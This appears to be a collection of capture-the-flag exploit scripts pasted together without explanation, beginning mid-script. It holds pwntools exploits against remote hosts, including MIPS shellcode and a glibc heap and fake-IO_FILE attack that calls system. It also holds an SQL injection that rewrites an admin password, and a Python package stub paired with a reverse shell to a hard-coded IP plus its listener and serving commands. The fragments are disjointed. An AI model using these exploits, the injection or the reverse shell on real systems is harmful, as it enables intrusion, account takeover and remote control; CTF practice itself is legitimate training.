writeShellcode(payload)
    #gdb.attach(sh, 'b *0x0000000000401624ncn')

sla('>> ', '2')
sla('>> ', '3')

ti()
from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'mips'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

    #sh = process(['qemu-mipsel-static', '-L', './', '-g', '1234', 'pwn'])
#
sh = remote('47.94.224.3',18154)
floor = 0
elf= cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def getCoins():
    global floor
    sla('>', '1')
    elf.srand(0x1BF52)
    sla('want?', str(elf.rand() % 114514 % (floor + 1)))
    floor += 1

def getAttack(c):
    sla('>', '3')
    sla('buy? ', c)

for i in range(99):
    getCoins()

getAttack('3')
getAttack('2')

payload = asm('andi $a2, $t2, 0x2222') + asm('andi $a1, $t2, 0x2222') + asm('andi $a1, $t2, 0x2222')+asm('andi $a1, $t2, 0x2222')
getCoins()
sla('>',payload)

ti()
from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

    #sh = remote('39.106.65.236',19493)
libc = ELF("./libc-2.35.so") 
elf= cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def add(idx, sz):
    while True:
        sla('ce: ','1')
        sla('explore: ', str(idx))
        sla(' time: ', str(sz))
        if ((elf.rand() % 10)<=4):
            sla('no)', '0')
            break
        else:
            sla('no)', '1')
def delete(idx):
    sla('ce: ','2')
    sla(': ', str(idx))
def show(idx):
    sla('ce: ','4')
    sla(': ', str(idx))

def edit(idx ,sz, c):
    sla('ce: ','3')
    sla('to: ', str(idx))
    sla('send: ', str(sz))
    sa('nclusions: ', c)

sh = process('./pwn')
seed = elf.time(0)
signFlag = (seed * 0xA3D70A3D70A3D70B) >> 64 
signR6_rax = signFlag >> 6 #rdx
signL2_rax = (signR6_rax << 2)
rax = signR6_rax + signL2_rax
rdx = rax*4
rax = rdx + rax
rax = rax << 2
seed = rax
print hex(seed)
elf.srand(seed)

add(0, 0x800)
add(1, 0x800)
add(2, 0x7f0)
delete(0)
add(3, 0xa00)
delete(2)
add(4, 0xa00)
show(0)
ru('follows:n')
heap_addr = u64(rc(8))-0x18c0+0x10 + 0x600
libc_base = u64(rc(8))-0x21a1d0

print hex(heap_addr)
print hex(libc_base)
add(0, 0x800)
add(2, 0x7f0)

add(0, 0x1000)
delete(0)

add(1, 0x520)
add(2,0x520)
add(3, 0x510)
add(4, 0x520)
delete(1)
add(2, 0x600)
delete(3)
target = libc_base + 0x21a680
fd_bk = libc_base + 0x21a110
fd_next = heap_addr + 0x2ed0

l_pre = libc_base + 0x228270
setcontext = libc_base + libc.sym['setcontext']
l_real = heap_addr + 0x2ed0

sig = SigreturnFrame()
sig.rip = libc_base + libc.sym['system']
sig.rdi = heap_addr + 0x3400+0x10
sig.rsp = heap_addr + 0x100

fake_io_addr = heap_addr + 0x3930
fake_largebin = p64(fd_bk)*2 + p64(fd_next) + p64(target-0x20)
payload = fake_largebin
payload = payload.ljust(0x528, ' ')
payload += p64(0x530)
payload += 'cat flag' + str(sig)[0x18:
0xd0] +p64(0)*2 + p64(fake_io_addr+0x40+0x38) + str(sig)[0xd8:]
payload = payload.ljust(0x530+0x528,' ')

payload += p64(0x521)+p64(libc_base + 0x219ce0)*2

fake_IO_FILE=p64(0)*4
fake_IO_FILE +=p64(1)+p64(0)
#
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=setcontext_rdx
fake_IO_FILE +=p64(setcontext+61)#_IO_save_end=call addr(call setcontext)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, 'x00')
fake_IO_FILE += p64(libc_base + libc.sym['system']) + p64(heap_addr+0x3410)
fake_IO_FILE += p64(heap_addr+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x80, 'x00')
fake_IO_FILE +=p64(heap_addr+0x3400)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, 'x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE += p64(libc_base+0x2160c0) + p64(libc_base + 0xebcf5)
# vtable=IO_wfile_jumps #call [rax+0x18]
    #fake_IO_FILE += p64(libc_base+0x2160c0) + p64(libc_base+0x000000000009d398)
'''
gd 0x9d398
mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
'''
fake_IO_FILE += p64(0)*5
fake_IO_FILE += p64(fake_io_addr+0x40+0x38)  # rax2_addr
payload += fake_IO_FILE
edit(0, len(payload), payload)
print hex(len(fake_IO_FILE))
print hex(fake_io_addr)
print hex(libc_base+0x000000000009d398)
    #gdb.attach(sh)
add(2, 0x600)
sla(':', '5')

ti()
admin';UPDATE ADMINS set PASSWORD = '17e7007726eeb36a85a5573e6a04bc1b';--
from setuptools import setup, find_packages

VERSION = '0.0.1' 
DESCRIPTION = 'My first Python package'
LONG_DESCRIPTION = 'My first Python package with a slightly longer description'

setup(
        name="123", 
        version=VERSION,
        author="Ten",
        author_email="admin@qq.com",
        description=DESCRIPTION,
        long_description=LONG_DESCRIPTION,
        packages=find_packages(),
        install_requires=[], # add any additional packages that 
  
)

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("8.130.30.76",8089))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
python3 setup.py sdist
python3 -m http.server 8080
nc -lvp 8089
zsteg -E "b1,bgr,lsb,xy" flag.png > 1
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]